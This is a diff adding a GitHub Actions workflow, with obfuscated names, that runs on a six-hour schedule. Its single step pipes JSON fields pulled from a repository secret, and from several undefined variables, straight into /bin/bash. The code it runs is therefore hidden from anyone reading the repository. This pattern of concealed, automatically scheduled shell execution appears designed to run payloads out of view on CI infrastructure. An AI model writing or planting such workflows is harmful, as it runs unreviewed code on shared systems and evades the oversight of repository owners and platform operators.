@@ -1,0 +1,21 @@
+name: jiaoxingjunyuanxun
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiaoxingjunyuanxun
+        env:
+          h05: ${{ secrets.h05 }}
+        run: |
+          echo $h05 | jq -r .d6 | /bin/bash
+          echo $ci6 | jq -r .jkqgi95145 | /bin/bash
+          echo $t3 | jq -r .p05 | /bin/bash
+          echo $okv0050 | jq -r .bj78238 | /bin/bash
+          echo $wk36 | jq -r .hljn4088 | /bin/bash
+
